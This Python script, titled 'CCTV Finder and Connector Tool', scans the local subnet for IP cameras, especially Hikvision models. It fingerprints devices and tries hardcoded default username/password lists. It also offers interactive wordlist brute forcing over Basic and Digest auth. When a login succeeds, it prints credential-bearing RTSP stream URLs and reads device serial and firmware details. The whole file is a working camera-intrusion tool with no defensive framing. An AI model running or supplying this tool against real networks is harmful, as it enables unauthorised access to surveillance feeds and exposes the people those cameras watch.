#!/usr/bin/env python3
import os
import sys
import socket
import ipaddress
import subprocess
import threading
import time
import requests
import base64
import re
import xml.etree.ElementTree as ET
from concurrent.futures import ThreadPoolExecutor
from requests.auth import HTTPBasicAuth, HTTPDigestAuth
from urllib3.exceptions import InsecureRequestWarning

# Suppress only the specific InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Common CCTV manufacturer ports
COMMON_PORTS = [80, 81, 82, 88, 443, 554, 8000, 8080, 8081, 8443, 9000, 37777]

# Expanded Hikvision credentials - comprehensive list of known defaults and common variations
HIKVISION_CREDENTIALS = [
    ('admin', '12345'),
    ('admin', 'admin'),
    ('admin', '123456'),
    ('admin', 'Admin12345'),
    ('admin', 'admin12345'),
    ('admin', 'hikvision'),
    ('admin', 'hikadmin'),
    ('admin', 'hik12345'),
    ('admin', 'password'),
    ('admin', 'admin123'),
    ('admin', 'Admin123'),
    ('admin', '888888'),
    ('admin', '54321'),
    ('admin', ''),  # Empty password
    ('admin', 'abcd1234'),
    ('admin', '4321'),
    ('admin', 'qwerty'),
    ('admin', '1111'),
    ('admin', '1234'),
    ('admin', 'Hikvision'),
    ('admin', 'HIKVISION'),
    ('operator', 'operator'),
    ('operator', '12345'),
    ('user', 'user'),
    ('user', '12345'),
    ('guest', 'guest'),
    ('guest', '12345'),
]

# Common CCTV credentials for other brands
COMMON_CREDENTIALS = [
    ('root', 'root'),
    ('root', ''),
    ('root', '12345'),
    ('root', 'pass'),
    ('user', 'user'),
    ('user', ''),
    ('user', '12345'),
]

# Common CCTV manufacturers and their identifiers in response
CCTV_IDENTIFIERS = [
    'hikvision', 'dahua', 'axis', 'hanwha', 'samsung', 'bosch', 'panasonic', 
    'vivotek', 'arecont', 'avigilon', 'geovision', 'mobotix', 'cctv', 'ipcam',
    'camera', 'dvr', 'nvr', 'xmeye', 'webservice', 'surveillance'
]

# Hikvision specific identifiers
HIKVISION_IDENTIFIERS = [
    'hikvision', 'webdvs', 'dvrdvs', 'webcamera', 'hikweb', 'webs', 'dvs-webs',
    'ivms', 'hikcentral', 'isapi', 'webdvr', 'dvs', 'ipcamera'
]

class CCTVFinder:
    def __init__(self):
        self.local_ip = self.get_local_ip()
        self.network = self.get_network_from_ip(self.local_ip)
        self.found_devices = []
        self.lock = threading.Lock()
        
    def get_local_ip(self):
        """Get the local IP address of the device"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            print("Could not determine local IP. Using 192.168.1.0/24 as default.")
            return "192.168.1.1"
    
    def get_network_from_ip(self, ip):
        """Convert IP to network address with /24 subnet"""
        parts = ip.split('.')
        network = f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
        return network
    
    def ping_host(self, ip):
        """Ping a host to check if it's online"""
        try:
            result = subprocess.run(
                ["ping", "-c", "1", "-W", "1", str(ip)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            return result.returncode == 0
        except:
            return False
    
    def scan_port(self, ip, port):
        """Check if a specific port is open on the host"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((str(ip), port))
        sock.close()
        return result == 0
    
    def check_cctv_signature(self, ip, port):
        """Check if the device at IP:port has CCTV signatures"""
        urls = [
            f"http://{ip}:{port}/",
            f"http://{ip}:{port}/index.html",
            f"http://{ip}:{port}/login.html",
            f"http://{ip}:{port}/doc/page/login.asp",
            # Hikvision specific URLs
            f"http://{ip}:{port}/ISAPI/System/deviceInfo",
            f"http://{ip}:{port}/PSIA/System/deviceInfo",
            f"http://{ip}:{port}/SDK/webLanguage",
            f"http://{ip}:{port}/doc/page/login.asp",
            f"http://{ip}:{port}/Security/users",
            f"http://{ip}:{port}/onvif-http/snapshot",
            # HTTPS variants
            f"https://{ip}:{port}/",
            f"https://{ip}:{port}/index.html",
            f"https://{ip}:{port}/login.html",
            f"https://{ip}:{port}/ISAPI/System/deviceInfo",
            # ONVIF
            f"http://{ip}:{port}/onvif/device_service",
            f"http://{ip}:{port}/device_service",
            f"http://{ip}:{port}/cgi-bin/snapshot.cgi",
        ]
        
        for url in urls:
            try:
                response = requests.get(url, timeout=2, verify=False)
                content = response.text.lower()
                headers = str(response.headers).lower()
                
                # Check for Hikvision identifiers first
                for identifier in HIKVISION_IDENTIFIERS:
                    if identifier in content or identifier in headers:
                        print(f"[+] Hikvision device detected at {ip}:{port}")
                        return True, url, "Hikvision"
                
                # Check for other CCTV identifiers
                for identifier in CCTV_IDENTIFIERS:
                    if identifier in content or identifier in headers:
                        return True, url, "Generic"
                
                # Check for common CCTV response codes
                if response.status_code == 401 and 'www-authenticate' in response.headers:
                    auth_header = response.headers['www-authenticate'].lower()
                    if 'hikvision' in auth_header:
                        return True, url, "Hikvision"
                    return True, url, "Generic"
            except:
                continue
        
        return False, None, None

    def verify_hikvision_auth(self, ip, port, username, password, auth_type):
        """Verify Hikvision credentials by checking specific protected endpoints"""
        verification_urls = [
            f"http://{ip}:{port}/ISAPI/System/deviceInfo",
            f"http://{ip}:{port}/ISAPI/Streaming/channels",
            f"http://{ip}:{port}/ISAPI/Security/userCheck",
        ]
        
        for url in verification_urls:
            try:
                if auth_type == "Basic" or auth_type == "Hikvision-Basic":
                    response = requests.get(
                        url,
                        auth=HTTPBasicAuth(username, password),
                        timeout=3,
                        verify=False
                    )
                else:
                    response = requests.get(
                        url,
                        auth=HTTPDigestAuth(username, password),
                        timeout=3,
                        verify=False
                    )
                
                # Check if we got a valid XML response with device info
                if response.status_code == 200:
                    if 'xml' in response.headers.get('Content-Type', ''):
                        # Try to parse XML to confirm it's valid
                        try:
                            root = ET.fromstring(response.content)
                            # If we can parse XML and find expected elements, auth is valid
                            if root.find('.//model') is not None or root.find('.//deviceType') is not None:
                                return True
                        except:
                            pass
                    
                    # Even if not XML, a 200 response to these endpoints likely means auth worked
                    return True
            except:
                continue
        
        return False

    def try_credentials(self, ip, port, url, device_type):
        """Try common credentials on the device"""
        successful_auth = []
        
        # Choose credentials based on device type
        credentials_to_try = HIKVISION_CREDENTIALS if device_type == "Hikvision" else COMMON_CREDENTIALS
        
        for username, password in credentials_to_try:
            # Try Basic Authentication
            try:
                response = requests.get(
                    url, 
                    auth=HTTPBasicAuth(username, password),
                    timeout=2,
                    verify=False
                )
                
                if response.status_code == 200:
                    # For Hikvision, verify the credentials with additional checks
                    if device_type == "Hikvision":
                        if self.verify_hikvision_auth(ip, port, username, password, "Basic"):
                            successful_auth.append((username, password, "Basic"))
                            print(f"[+] Found working credentials for {ip}:{port} - {username}:{password} (Basic)")
                            return successful_auth  # Return on first verified credential
                    else:
                        successful_auth.append((username, password, "Basic"))
                        print(f"[+] Found working credentials for {ip}:{port} - {username}:{password} (Basic)")
                        return successful_auth  # Return on first verified credential
            except:
                pass
            
            # Try Digest Authentication
            try:
                response = requests.get(
                    url, 
                    auth=HTTPDigestAuth(username, password),
                    timeout=2,
                    verify=False
                )
                
                if response.status_code == 200:
                    # For Hikvision, verify the credentials with additional checks
                    if device_type == "Hikvision":
                        if self.verify_hikvision_auth(ip, port, username, password, "Digest"):
                            successful_auth.append((username, password, "Digest"))
                            print(f"[+] Found working credentials for {ip}:{port} - {username}:{password} (Digest)")
                            return successful_auth  # Return on first verified credential
                    else:
                        successful_auth.append((username, password, "Digest"))
                        print(f"[+] Found working credentials for {ip}:{port} - {username}:{password} (Digest)")
                        return successful_auth  # Return on first verified credential
            except:
                pass
        
        return successful_auth

    def check_device(self, ip):
        """Check if an IP address hosts a CCTV device"""
        if not self.ping_host(ip):
            return
        
        for port in COMMON_PORTS:
            if self.scan_port(ip, port):
                is_cctv, url, device_type = self.check_cctv_signature(ip, port)
                if is_cctv and url:
                    credentials = self.try_credentials(ip, port, url, device_type)
                    with self.lock:
                        self.found_devices.append({
                            'ip': str(ip),
                            'port': port,
                            'url': url,
                            'device_type': device_type,
                            'credentials': credentials
                        })
                    if not credentials:
                        print(f"[+] Found potential {device_type} CCTV at {ip}:{port} (No credentials found)")

    def scan_network(self):
        """Scan the network for CCTV devices"""
        print(f"[*] Scanning network: {self.network}")
        print(f"[*] Local IP: {self.local_ip}")
        print("[*] This may take a few minutes...")
        
        network = ipaddress.IPv4Network(self.network)
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            executor.map(self.check_device, network.hosts())

    def display_results(self):
        """Display the scan results"""
        if not self.found_devices:
            print("\n[!] No CCTV devices found on the network.")
            return
        
        print(f"\n[+] Found {len(self.found_devices)} potential CCTV devices:")
        
        for i, device in enumerate(self.found_devices, 1):
            print(f"\n{i}. Device: {device['ip']}:{device['port']} ({device['device_type']})")
            print(f"   URL: {device['url']}")
            
            if device['credentials']:
                print("   Working credentials:")
                for username, password, auth_type in device['credentials']:
                    print(f"   - Username: {username}, Password: {password}, Auth Type: {auth_type}")
            else:
                print("   No working credentials found from common list.")
                if device['device_type'] == "Hikvision":
                    print("   Try Hikvision defaults or use the brute force option.")

    def brute_force_device(self, device_index, wordlist_path=None, username=None):
        """Perform a more thorough brute force on a specific device using a wordlist"""
        if device_index < 0 or device_index >= len(self.found_devices):
            print("[!] Invalid device selection.")
            return
        
        device = self.found_devices[device_index]
        ip = device['ip']
        port = device['port']
        url = device['url']
        device_type = device['device_type']
        
        # If no username provided, use default admin
        if not username:
            username = "admin"
            print(f"[*] Using default username: {username}")
        
        print(f"\n[*] Starting brute force on {ip}:{port} ({device_type})...")
        
        # Verification URLs for more reliable detection
        verification_urls = [
            f"http://{ip}:{port}/ISAPI/System/deviceInfo",
            f"http://{ip}:{port}/ISAPI/Streaming/channels",
            f"http://{ip}:{port}/ISAPI/Security/userCheck",
        ]
        
        auth_methods = [HTTPBasicAuth, HTTPDigestAuth]
        auth_names = ["Basic", "Digest"]
        
        # Use wordlist if provided, otherwise use extended built-in list
        if wordlist_path and os.path.exists(wordlist_path):
            print(f"[*] Using wordlist: {wordlist_path}")
            try:
                with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                    passwords = [line.strip() for line in f if line.strip()]
                print(f"[*] Loaded {len(passwords)} passwords from wordlist")
            except Exception as e:
                print(f"[!] Error loading wordlist: {str(e)}")
                print("[*] Falling back to built-in password list")
                # Extended credential list for brute force
                passwords = [pwd for _, pwd in HIKVISION_CREDENTIALS]
                # Add device-specific variations
                passwords.extend([
                    f'admin{ip.split(".")[-1]}',  # admin + last octet
                    f'admin{ip.replace(".", "")}',  # admin + full IP without dots
                    'camera', 'Camera123', 'camera123',
                    'pass123', 'Pass123', 'Password123', 'password123',
                    'admin@123', 'Admin@123', 'P@ssw0rd', 'p@ssw0rd',
                    'qwerty123', 'Qwerty123', '123qwe', '123abc',
                    '1q2w3e', '1q2w3e4r', 'abcd1234', 'Abcd1234'
                ])
        else:
            print("[*] No wordlist provided, using built-in password list")
            # Extended credential list for brute force
            passwords = [pwd for _, pwd in HIKVISION_CREDENTIALS]
            # Add device-specific variations
            passwords.extend([
                f'admin{ip.split(".")[-1]}',  # admin + last octet
                f'admin{ip.replace(".", "")}',  # admin + full IP without dots
                'camera', 'Camera123', 'camera123',
                'pass123', 'Pass123', 'Password123', 'password123',
                'admin@123', 'Admin@123', 'P@ssw0rd', 'p@ssw0rd',
                'qwerty123', 'Qwerty123', '123qwe', '123abc',
                '1q2w3e', '1q2w3e4r', 'abcd1234', 'Abcd1234'
            ])
        
        # Remove duplicates while preserving order
        passwords = list(dict.fromkeys(passwords))
        
        print(f"[*] Starting brute force with {len(passwords)} passwords...")
        print("[*] Press Ctrl+C to stop the brute force process")
        
        successful_auth = []
        total_passwords = len(passwords)
        
        try:
            for idx, password in enumerate(passwords):
                progress = (idx + 1) / total_passwords * 100
                print(f"[*] Progress: {progress:.1f}% - Trying {username}:{password}...", end='\r')
                
                for i, auth_method in enumerate(auth_methods):
                    for verification_url in verification_urls:
                        try:
                            response = requests.get(
                                verification_url,
                                auth=auth_method(username, password),
                                timeout=3,
                                verify=False
                            )
                            
                            if response.status_code == 200:
                                # Verify it's a valid response
                                if 'xml' in response.headers.get('Content-Type', ''):
                                    try:
                                        root = ET.fromstring(response.content)
                                        if root.find('.//model') is not None or root.find('.//deviceType') is not None:
                                            successful_auth.append((username, password, auth_names[i]))
                                            print(f"\n[+] SUCCESS! Found working credentials: {username}:{password} ({auth_names[i]})")
                                            
                                            # Update device credentials
                                            device['credentials'] = [(username, password, auth_names[i])]
                                            return successful_auth
                                    except:
                                        pass
                                else:
                                    # Even if not XML, a 200 response to these endpoints likely means auth worked
                                    successful_auth.append((username, password, auth_names[i]))
                                    print(f"\n[+] SUCCESS! Found working credentials: {username}:{password} ({auth_names[i]})")
                                    
                                    # Update device credentials
                                    device['credentials'] = [(username, password, auth_names[i])]
                                    return successful_auth
                        except:
                            continue
        except KeyboardInterrupt:
            print("\n[!] Brute force interrupted by user")
        
        print("\n[!] Brute force completed. No working credentials found.")
        return []

    def brute_force_with_wordlist(self, device_index):
        """Perform brute force using a custom wordlist"""
        print("\n[*] Brute Force with Wordlist")
        print("=" * 40)
        
        # Get username
        username = input("[?] Enter username to try (default: admin): ").strip()
        if not username:
            username = "admin"
        
        # Get wordlist path
        wordlist_path = input("[?] Enter path to password wordlist file: ").strip()
        
        if not wordlist_path:
            print("[!] No wordlist provided. Using built-in password list.")
            wordlist_path = None
        elif not os.path.exists(wordlist_path):
            print(f"[!] Wordlist file not found: {wordlist_path}")
            use_default = input("[?] Use built-in password list instead? (y/n): ").lower()
            if use_default != 'y':
                return
            wordlist_path = None
        
        return self.brute_force_device(device_index, wordlist_path, username)

    def connect_to_device(self, device_index):
        """Attempt to connect to a specific device"""
        if device_index < 0 or device_index >= len(self.found_devices):
            print("[!] Invalid device selection.")
            return
        
        device = self.found_devices[device_index]
        print(f"\n[*] Connecting to {device['ip']}:{device['port']} ({device['device_type']})...")
        
        if device['credentials']:
            username, password, auth_type = device['credentials'][0]
            print(f"[*] Using credentials: {username}/{password} ({auth_type} Authentication)")
            
            # For RTSP streams
            if device['device_type'] == "Hikvision":
                rtsp_urls = [
                    f"rtsp://{username}:{password}@{device['ip']}:554/Streaming/Channels/101",
                    f"rtsp://{username}:{password}@{device['ip']}:554/Streaming/Channels/102",
                    f"rtsp://{username}:{password}@{device['ip']}:554/h264/ch1/main/av_stream",
                    f"rtsp://{username}:{password}@{device['ip']}:554/h264/ch1/sub/av_stream",
                    f"rtsp://{username}:{password}@{device['ip']}:554/ISAPI/Streaming/Channels/101",
                    f"rtsp://{username}:{password}@{device['ip']}:554/ISAPI/Streaming/Channels/102"
                ]
                print(f"[*] Possible Hikvision RTSP URLs:")
                for url in rtsp_urls:
                    print(f"   - {url}")
            else:
                rtsp_url = f"rtsp://{username}:{password}@{device['ip']}:554/Streaming/Channels/101"
                print(f"[*] Possible RTSP URL: {rtsp_url}")
            
            # For HTTP/HTTPS
            if device['url'].startswith('http'):
                print(f"[*] Web interface URL: {device['url']}")
                print(f"[*] Username: {username}")
                print(f"[*] Password: {password}")
            
            # Try to get device information
            if device['device_type'] == "Hikvision":
                try:
                    device_info_url = f"http://{device['ip']}:{device['port']}/ISAPI/System/deviceInfo"
                    if auth_type == "Basic" or auth_type == "Hikvision-Basic":
                        response = requests.get(
                            device_info_url,
                            auth=HTTPBasicAuth(username, password),
                            timeout=3,
                            verify=False
                        )
                    else:
                        response = requests.get(
                            device_info_url,
                            auth=HTTPDigestAuth(username, password),
                            timeout=3,
                            verify=False
                        )
                    
                    if response.status_code == 200 and 'xml' in response.headers.get('Content-Type', ''):
                        print("\n[*] Device Information:")
                        # Extract device model, firmware version, and serial number
                        model_match = re.search(r'<model>(.*?)</model>', response.text)
                        firmware_match = re.search(r'<firmwareVersion>(.*?)</firmwareVersion>', response.text)
                        serial_match = re.search(r'<serialNumber>(.*?)</serialNumber>', response.text)
                        
                        if model_match:
                            print(f"   - Model: {model_match.group(1)}")
                        if firmware_match:
                            print(f"   - Firmware: {firmware_match.group(1)}")
                        if serial_match:
                            print(f"   - Serial Number: {serial_match.group(1)}")
                except Exception as e:
                    print(f"[!] Could not retrieve device information: {str(e)}")
        else:
            print("[!] No working credentials found. You can try brute forcing this device.")
            
        print("\n[*] You can try opening the web interface URL in a browser")
        print("[*] For RTSP streams, you can use VLC or other media players")
        
        # Additional Hikvision-specific information
        if device['device_type'] == "Hikvision":
            print("\n[*] Hikvision-specific information:")
            print("   - Default ports: 80, 8000, 554 (RTSP)")
            print("   - Common web interfaces: /doc/page/login.asp, /ISAPI/System/deviceInfo")
            print("   - Reset methods: Press and hold reset button for 10 seconds")
            print("   - Factory default credentials: admin/12345 or admin/[blank]")

def main():
    print("=" * 60)
    print("CCTV Finder and Connector Tool")
    print("=" * 60)
    print("Specialized for Hikvision cameras")
    print("=" * 60)
    
    finder = CCTVFinder()
    finder.scan_network()
    finder.display_results()
    
    if finder.found_devices:
        while True:
            try:
                print("\nOptions:")
                print("1. Connect to a device")
                print("2. Brute force a device (built-in wordlist)")
                print("3. Brute force a device with custom wordlist")
                print("q. Quit")
                
                choice = input("\nEnter your choice: ")
                
                if choice.lower() == 'q':
                    break
                elif choice == '1':
                    device_num = input("Enter device number to connect: ")
                    device_index = int(device_num) - 1
                    finder.connect_to_device(device_index)
                elif choice == '2':
                    device_num = input("Enter device number to brute force: ")
                    device_index = int(device_num) - 1
                    finder.brute_force_device(device_index)
                elif choice == '3':
                    device_num = input("Enter device number to brute force: ")
                    device_index = int(device_num) - 1
                    finder.brute_force_with_wordlist(device_index)
                else:
                    print("[!] Invalid option")
            except ValueError:
                print("[!] Please enter a valid number or 'q' to quit.")
            except KeyboardInterrupt:
                break
    
    print("\n[*] Thank you for using CCTV Finder!")

if __name__ == "__main__":
    main()


